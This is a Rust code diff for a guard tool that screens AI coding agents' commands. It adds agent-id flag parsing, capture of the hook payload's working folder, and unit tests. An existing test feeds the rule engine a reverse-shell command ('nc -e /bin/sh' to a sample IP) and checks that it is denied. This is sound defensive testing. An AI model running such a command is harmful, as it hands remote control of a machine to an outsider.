@@ -21,9 +21,11 @@ use innerwarden_agent_guard::{hook, mcp::analyze_command, rules::RuleEngine};
 mod agent_policy;
 mod agents_io;
 mod binary_freshness;
+mod concern;
 mod contain;
 mod contain_io;
 mod dashboard;
+mod dashboard_community;
 mod first_run;
 mod graph_io;
 mod help;
@@ -481,6 +483,37 @@ fn hook_session(payload: &str) -> Option<String> {
         .filter(|session| !session.trim().is_empty())
 }
 
+/// The folder the agent ran the command in (`cwd` in the hook payload). Only
+/// its basename is ever recorded (`graph_io::project_name`).
+fn hook_cwd(payload: &str) -> Option<String> {
+    serde_json::from_str::<serde_json::Value>(payload)
+        .ok()
+        .and_then(|value| {
+            value
+                .get("cwd")
+                .and_then(|cwd| cwd.as_str())
+                .map(str::to_string)
+        })
+        .filter(|cwd| !cwd.trim().is_empty())
+}
+
+/// The agent a hook or proxy line names (`--agent <id>`), when it names a
+/// plain agent id. The connect step writes it; nothing guesses it.
+fn agent_flag(rest: &[String]) -> Option<String> {
+    let mut it = rest.iter();
+    while let Some(arg) = it.next() {
+        let value = if arg == "--agent" {
+            it.next().map(String::as_str)
+        } else {
+            arg.strip_prefix("--agent=")
+        };
+        if let Some(value) = value {
+            return innerwarden_agent_guard::hook::is_agent_id(value).then(|| value.to_string());
+        }
+    }
+    None
+}
+
 /// Provider event identity used only to make hook delivery idempotent. The raw
 /// value never crosses the graph persistence boundary: `graph_io` immediately
 /// combines it with the resolved session and stores only a one-way digest.
@@ -739,6 +772,8 @@ fn cmd_hook(rest: &[String]) -> std::process::ExitCode {
         would_block_under_policy,
         source_session.as_deref(),
         source_event_id.as_deref(),
+        agent_flag(rest).as_deref(),
+        hook_cwd(&buf).as_deref(),
     );
     if would_block_under_policy {
         // In monitor mode this is a would-block alert; in enforce it accompanies
@@ -1508,6 +1543,7 @@ fn format_alert(label: &str, d: &ProxyDecision) -> String {
 fn cmd_proxy(rest: &[String]) -> std::process::ExitCode {
     let mut mode_label = String::from("guard");
     let mut label = String::from("innerwarden");
+    let mut agent: Option<String> = None;
     let mut error_response = false;
     let mut server_cmd: Vec<String> = Vec::new();
 
@@ -1529,6 +1565,17 @@ fn cmd_proxy(rest: &[String]) -> std::process::ExitCode {
                 label = v.clone();
             }
             "--error-response" => error_response = true,
+            "--agent" => {
+                let Some(v) = it.next() else {
+                    eprintln!("innerwarden proxy: --agent requires a value");
+                    return std::process::ExitCode::from(2);
+                };
+                agent = innerwarden_agent_guard::hook::is_agent_id(v).then(|| v.clone());
+            }
+            other if other.starts_with("--agent=") => {
+                let v = other.trim_start_matches("--agent=");
+                agent = innerwarden_agent_guard::hook::is_agent_id(v).then(|| v.to_string());
+            }
             "--" => {
                 server_cmd = it.cloned().collect();
                 break;
@@ -1588,7 +1635,7 @@ fn cmd_proxy(rest: &[String]) -> std::process::ExitCode {
     let on_event = move |d: &ProxyDecision| {
         // The graph is an action timeline: persist every client tools/call,
         // including allows, but never persist a server response as a command.
-        graph_io::record_mcp(d, mode, Some(&proxy_session));
+        graph_io::record_mcp(d, mode, Some(&proxy_session), agent.as_deref());
         if !d.verdict.alerts.is_empty() {
             eprintln!("{}", format_alert(&label, d));
         }
@@ -1938,6 +1985,29 @@ mod tests {
     fn reverse_shell_denies() {
         let engine = RuleEngine::load_embedded();
         assert!(is_deny(&analyze("nc -e /bin/sh 1.2.3.4 4444", &engine)));
+    }
+
+    #[test]
+    fn channel_origin_is_read_from_what_the_caller_was_told() {
+        let args = |list: &[&str]| list.iter().map(|a| a.to_string()).collect::<Vec<_>>();
+        assert_eq!(
+            agent_flag(&args(&["--monitor", "--agent", "claude-code"])).as_deref(),
+            Some("claude-code")
+        );
+        assert_eq!(
+            agent_flag(&args(&["--agent=cursor"])).as_deref(),
+            Some("cursor")
+        );
+        // Nothing passed, a value that is not a plain id, or a flag with no
+        // value: no agent, never a guess.
+        assert_eq!(agent_flag(&args(&["--monitor"])), None);
+        assert_eq!(agent_flag(&args(&["--agent", "Claude Code"])), None);
+        assert_eq!(agent_flag(&args(&["--agent"])), None);
+        assert_eq!(
+            hook_cwd(r#"{"cwd":"/home/dev/my-app","tool_input":{}}"#).as_deref(),
+            Some("/home/dev/my-app")
+        );
+        assert_eq!(hook_cwd(r#"{"tool_input":{}}"#), None);
     }
 
     #[test]
